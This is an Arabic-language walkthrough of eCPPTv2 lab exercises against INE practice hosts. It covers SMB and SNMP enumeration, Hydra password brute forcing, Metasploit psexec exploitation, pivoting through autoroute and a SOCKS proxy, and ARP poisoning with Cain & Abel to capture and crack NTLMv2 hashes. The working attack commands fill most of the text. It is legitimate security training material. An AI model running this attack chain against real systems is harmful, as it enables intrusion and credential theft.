# Session 4 (eCPPTv2) - Day 4  
## Penetration Testing: Network Security  

السلام عليكم ورحمة الله وبركاته  

اليوم باذن الله راح نكمل من حيث توقفنا امس  

---

معنا اليوم باذن الله اول لاب  

NetBIOS Hacking
----------------|  

طبعا معنا اول لاب هذا وبنسوي فيه بوفت واشياء حلوه خلونا نبدا  

اول شي راح نقرا الملف الي فيه التارقت  
```bash
demo.ine.local 10.0.17.62  
demo1.ine.local 10.2.22.69  
```  

طبعا نشوف ملف /etc/hosts لو مو مضافه فيه الايبي والدومينات بنفس الشكل الي فوق نضيفهم حنا ونحفظ الملف  

طيب لو حاولنا نسوي بنق على كل التارقتس عشان نشوف هل فعلا عندنا وصول او لا  
```bash
ping demo.ine.local  
ping demo1.ine.local  
```  
طبعا نشوف انه الايبي الي نهاية 62 عندنا وصول له ونقدر نسوي بنق بعكس التارقت الثاني ماعندنا له وصول  

طيب خلونا نفحص اول تارقت بالـ nmap  
```bash
nmap -sV -sC demo.ine.local  
```  
نشوف انه بورت 139و445 مفتوحه خل نسوي عليها بعض البحث  

```bash
nmap -p445 --script smb-protocols demo.ine.local  
```  
نشوف انه عطانا 3 اصدارات من الـ1 الى 3  

طيب خلونا الـ smb protocol security level  
```bash
nmap -p445 --script smb-security-mode demo.ine.local  
```  
طيب الان نشوف الـ account_used: guest  

وهذا اول يوزر حصلناه طبعا الان خل نشوف هل فيه null session ونقدر نتصل عن طريقه او لا  

```bash
smbclient -L  demo.ine.local  
Enter WORKGROUP\root's password: <enter>  
```  
الان نشوف انه عطيناه ان الباسورد فاضي ونشوف انه عطانا الـshare folders  

طيب خلونا نشوف هل نقدر يوزرات زيادة ولا لا باتسخدام script nmpa  
```bash
nmap -p445 --script smb-enum-users.nse  demo.ine.local  
```  
نشوف انه حصلنا 3 يوزرات زيادة والي هي  
```bash
admin  
administrator  
root  
```  

طيب خلونا نسوي brute force على اليوزرات الجديده  
```bash
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb  
```  

نشوف انه عطانا اليوزر والباسورد الان خلونا نستخدم الـ psexec على الـ MSF عشان نستغل التارقت  
```bash
msfconsole -q  
use exploit/windows/smb/psexec  
set RHOSTS demo.ine.local  
set SMBUser administrator  
set SMBPass password1  
exploit  
```  
ونشوف انه جانا meterpreter session  

طيب خلونا نشوف ايش الصلاحيات الي معنا ونشوف معلومات عن النظام هذا  
```bash
getuid  
sysinfo  
```  

نشوف انه معنى اعلى صلاحيات بالنظام والي هي SYSTEM or NT AUTHORITY\SYSTEM  

طبعا فيه فلاق تقعد تدوره طبعا حنا نعرف وينه ف اختصار للوقت راح نقراه مباشره  
```bash
cat C:\\Users\\Administrator\\Documents\\FLAG1.txt  
```  
وطبعا زي ماقلنا بالـ meterpreter session ندبل الـ \ لانه الوحده راح يعتبرها escape  
الان نشوف انه عطانا الفلاق والامور زي الحلاوه  

طيب خلونا نشوف الدومين الثاني هل عندنا عليه اكسس من التارقت هذا دامنا استغليناه او لا  
```bash
shell  
ping 10.0.22.69  
```  
طيب نشوف انه فعلا فيه access من التارقت بعكس جهازنا لما حاولنا نسوي بنق رفض لانه مافيه اتصال بيننا  

طيب هنا الان نقدر نسوي pivoting  
خلونا اول شي نطلع من الشيل وندخل على الـ meterpreter session  
وكذالك راح نضيف ايبي الشبكة كامله الي ماقدرنا نسوي لها بنق من جهازنا وضبط البنق في جهاز التارقت راح نضيفه بالـ routeTable  
```bash
CTRL + C  
y  
run autoroute -s 10.0.22.69/20  
```  
طبعا بتقول كيف عرفت انه بيكون ايبي الشبكة بهالشكل  
عندك خيارين  
1. use ipconfig command on target machine one
2. IP calculator  

طيب حلو الان تم اضافته الى الـ routeTable  
طيب خلونا نتكلم شوي  

قبل كنا نسوي portfwd بعد هذي الخطوه وكان الموضوع محكور شوي لانه لازم تسوي portfwd لكل بورت مفتوح على الجهاز  
بمعنى ماتقدر تستخدم مثلا nmap على كامل الشبكه  
لازم تستخدم الميتاسبلويت وتشوف ايش البورتات المفتوحه بعدين تسوي portfwd  
وشي متعب انك بتقدر تسوي على كل بورت هالشي ف جانا شي اسمه proxychains  
وظيفته نفس الـ portfwd بس لايبي الشبكة كامل  
الان مع التطبيق راح توضح اكثر تابعو معي  

اول شي نحتاج نعرف اصدار الـ proxychains عندنا كم  
ونقدر نعرف عن طريق انه نقرا هذا الملف  
```bash
cat /etc/proxychains4.conf  
```  
نشوف انه كاتب لنا انه socks4 وهذا يعني انه اصداره 4  
وكذالك لو نلاحظ انه معطينا رقم البورت تبع الـ socks server والي هو 9050  

طيب الان خلونا نستعمل موديول جديد علينا في الميتاسبلويت وليه نستخدمه بالميتاسبلويت لانه اساسا حنا مسوين او اضفنا ايبي الشبكة الى الـ routeTable عن طريق MSF خلونا نشوف مع بعض الان  
```bash
background [to set the session on background]  
use auxiliary/server/socks_proxy  
show options  
set SRVPORT 9050  
set VERSION 4a  
exploit  
jobs  
```  
طيب الان راح نشرح كم شي هنا سويناه  
طبعا يوم شفنا الاوبشن حصلنا ان الـ SRVHOST 0.0.0.0 وهذا يعني انه على اللوكال هوست  
طبعا اللوكال هوست يكتب على اكثر من شكل وهذي احد الاشكال من نظام الـ ipv4  
```bash
127.0.0.1  
0.0.0.0  
localhost  
```  
كلها نفس الشي بس اختلاف طريقة الكتابه ولا بالاخير راح يوديك على اللوكال  
الباقي البورت نفس الي حصلناه بالملف والاصدار كذالك بعدين عطيناه اكسبلويت  
طيب الان بعد ماسوينا اكسبلويت نشوف انه قالنا هالكلام  
```bash
Auxiliray module running as background job 0.  
Starting the SOCKS proxy server.  
```  
طيب الان كيف بنتاكد من انه شغال او لا؟  
هنا يجي دور امر jobs والي هو راح يعرض لنا اي شي شغال بالخلفيه  

طيب الان طبعا نقدر نفحص التارقت بأي اداة نبيها فقط نخلي قبلها كلمة "proxychains"  
خلونا نجرب ننفذ هذا الامر من جهازنا او من جهاز الاتاكر  
```bash
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445  
```  
نشوف انه فعلا قال ان بورت 445 مفتوح وعطانا اصدار الخدمه الي شغال  

طيب خلونا الان نسوي شوي enumration عن هذا البورت الي مفتوح بالتارقت  
```bash
sessions -i 1  
shell  
net view 10.0.22.69  
```  
net view command to find all resources shared by the demo1.ine.local machine.  
طبعا نشوف انه قال Access is denied  
وهذا بسبب ان البروسس ماسوينا له migrate فخلونا نرجه للـ meterpreter session ونسوي migrate  
```bash
CTRL + C  
migrate -N explorer.exe  
shell  
net view 10.0.22.69  
```  
نشوف انه عطانا مجلدين والي هي Documents , K  
طيب الان خلونا نضيفها عندنا بجهاز الضحيه يعني ونشوف موجود داخل كل مجلد فيهم  
```bash
net use D: \\10.0.22.69\Documents  
net use K: \\10.0.22.69\K$  
```  
نشوف انه اضافها لنا تحت هذي المسارين  
```bash
dir D:  
dir K:  
```  
طبعا اضافها كانها هارد بالجهاز الويندوز الي هو التارقت  
بعد ماسوينا dir طبعا حصلنا الفلاق بمسار الـ D  
وحصلنا ملف اسمه Confidential.txt  
طيب خلونا الان نرجع الى الـ meterpreter session ونقرا الفلاق والملف نشوف وش فيه  
```bash
CTRL + C  
cat D:\\Confidential.txt  
cat D:\\FLAG2.txt  
```  

طبعا نشوف انه حصلنا داخل الملف معلومات عن فيزا طبعا الهدف من وجود الملف انه تبدا تتعود على الملفات الحساسه او الملفات الي فيها معلوما يعني sesnsitive من اسمها يعني بتجذبك  

الى هنا انتهى اللاب نشوف الي بعده  

---  


SNMP Analysis  
--------------|  

طيب الان معطينا نفس الدومين الي قبل خلونا نفحصه  
```bash
nmap -sV -sC demo.ine.local  
```  

نشوف انه عطانا 4 بورتات اوبن وبنفس الوقت هذي فقط بورتات الـ TCP خلونا نجرب نفحص الـ UDP ports  

طبعا المفروض نفحص كامل بورتات الـ UDP لكن راح يطول ف بنختصر ونشوف بورت snmp protocol فقط  
```bash
nmap -sU -p 161 demo.ine.local  
```  
نشوف انه اوبن  
طبعا لابد تتاكد انه شغال سواء بالـ nc او انك تدلخ البورت المفتوح  
لانه بورتات الـ UDP ممكن يقوله انه open وهو بالواقع لا  

خلونا نستخدم سكربت  
```bash
nmap -sU -p 161 --script=snmp-brute demo.ine.local  
```  

نشوف انه حصلنا ثلاث community names  
```bash
public  
private  
secret  
```  

طبعا فيه اداة اسمها snmpwalk راح نستخدمها  
```bash
snmpwalk -v 1 -c public demo.ine.local  
```  
-v: Specifies SNMP version to use  
-c: Set the community string  

طيب نشوف انه عطانا مخرجات كثيره مره  
طبعا بنحصل الانترفيسس ومسارات مجلدات  
طبعا مرات احد المجلدات تقدر تعرف اليوزر نيم   
تقدر بعد تشوف البروسس الي شغاله على الجهاز  
طبعا فيه اشياء مهمه واشياء ماتعنينا  

خلونا نشغل عليه كل السكريبتات الموجوده في nmap  
```bash
nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output  
```  
طبعا راح يحفظ لنا المخرجات في ملف اسمه snmp_output  

الان لو نقرا المخرجات بنشوف انه حصلنا يوزرات  
```bash
Administrator  
DefaultAccount  
Guest  
EDAGUtiltyAccount  
```  
طبعا راح ناخذهم ونحطهم بملف لحالهم وبنسوي brute force  

طبعا اهم يوزر عندنا او الي يجذبنا اكثر هو Administrator بسبب انه اعلى صلاحيات  

خلونا نسوي البروت فورس الان  
```bash
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb  
```  
نشوف انه حصلنا باسوردين حق اليوزر Administrator , admin  

طبعا نشوف انه اليوزرات طلعناها كانت عن طيب snmp  
طبعا لو نشوف البروت فورس كان على smp والهدق انه فيه command execution  

الان راح نستغله بالـ psexec عن طريق الميتا سبلويت بنفس الطريقه السابقه  
```bash
msfconsole -q  
use exploit/windows/smb/psexec  
show options  
set RHOSTS demo.ine.local  
set SMBUSER administrator  
set SMBPASS elizabeth  
exploit  
```  

نشوف انه عطانا meterpreter session والان مطلوب مننا نقرا الفلاق فقط  
```bash
shell  
cd C:\  
dir  
type FLAG1.txt  
```  

ونشوف انه جبنا الفلاق  

الى هنا انتهى اللاب نشوف الي بعده  

---  

Cain & Abel  
------------|  

طبعا هنا راح نستخدم تول اسمها Cain تستخدم بـ ARP poisoning attack  

طبعا عشان نشغله نضغط على زر Sniffer  

طبعا نشوف انه عطانا الهوستات الموجودة  
ipv4 , MAC Adress etc..  

طبعا نعرف انه يستخدم ARP protocol  

خلونا الان نسوي MAC Address scan  
عن طريق انه نضغط هذا الزر  
[MAC_Address_scan_button](https://i.ibb.co/m5wzvM0/3.png)  

بتطلع لك نافذه اضغط OK  

نشوف انه بدا يسوي scan طبعا بطيئ جدا لكن ننتظر  
طيب الان بعد ماطلع لنا الهوستات الان نفحص الهوستات  
نضغط على العلامة حقت النووي الي تحت جنب hosts  
ونضغط زر ضغط +  
[add_targets](https://i.ibb.co/S3vMs5J/8.png)  

نضغط OK  

الان ننتظره يضيف الهوستات  
بعد مااضافها نضغط علامة النووي مره ثانيه  
[run_scan](https://i.ibb.co/J3CymRy/11.png)  

نشوف انه بدا يفحص الان  

فيه خيار الي هو passowrds تحت نضغطه ونشوف النتيجة  
[password_button](https://i.ibb.co/Yd40VYV/13.png)  

طبعا الان خلونا نضغط على زر الـ FTP ونشوف انه فيه باسوردات ويوزرات لكل هوست  
طيب لو نشوف يسار بنفس القائمة بنحصل SMB نضغط عليها ونشوف انه فيها هاشات ويوزرات  
[smp_hashs](https://i.ibb.co/wLTZN7F/16.png)  

طيب الان بما انه معنا اليوزر ومعنا هاش اليوزر خل نحاول نسوي له crack  
نضغط كليك يمين بالماوس على اول يوزر مثلا الي هو aline ونختار Send to Cracker  
[send_to_cracker_option](https://i.ibb.co/pbh5LT0/17.png)  

الان نضغط Cracker الي جنب زر Sniffer  
نشوف يسار انه عطانا انه فيه NTLMv2 Hashes وفيه فقط 1 الي حنا ارسلناه  
[NTMLv2_on_Cracker](https://i.ibb.co/YD9KrfZ/19.png)  

نضغط عليها ونشوف انه عطانا الي ارسلناه حق alien خلونا نسوي له كراك الان  
نضغط عليه كليك يمين ونختار Dictionary Attack  
[Dictionary_Attack](https://i.ibb.co/CMzNTTF/21.png)  

نضغط فوق بالمساحه الفاضيه كليك يمين ونختار Add to list عشان نضيف له الـ wordlist  
[wordlist_add](https://i.ibb.co/74vSTth/23.png)  

طبعا نشوف فتح لنا الملفات نختار ملف اسمه wordlist موجود في الـ Desktop  
ونضغط Start  

بنشوف انه قالنا انه خلص وسوا لنا كراك  
نضغط دبل كليك يسار على الـ position عشان نشوف وش الباسورد الي بسطر 206  
نضغط exit  
ونروح من البار الي فوق نضغط network  
[network_option](https://i.ibb.co/DzFXVRN/27.png)  

ومن القائمة الي يمين نضغط كليك يمين على زر Quick List ونختار Add to Quick List  
ونكتب الايبي نفسه الي فيه يوزر alien  
نضغط على الايبي كليك يمين ونخار Connect As  
بيطلب منا اليوزر والباسورد  
نشوف انه دخلنا الان والوضضع تمام  

الان من القائمة الي يسار نختار services  
نشوف انه عطانا الـ services كامله الي شغاله نضغط على كلمة services من القائمة الي يمين ونختار Install Abel  

نشوف انه اضاف لنا الخدمة الي اسمها Able وحالتها running  
طيب الان من القائمة الي يسار نروح لزر Console  
ونقدر ننفذ اي امر نبيه من هنا مثل  
```bash
whoami  
hostname  
```  

طبعا الى هنا انتهى اللاب  

باذن الله نكمل بعد اجازة يوم التأسيس باذن الله  


Happy weekend :)  

---  

## Follow us on:  
Twitter:  
[s4cript](https://twitter.com/s4cript)  
[cyberhub](https://twitter.com/cyberhub)  
[0xNawaF1](https://twitter.com/0xNawaF1)  

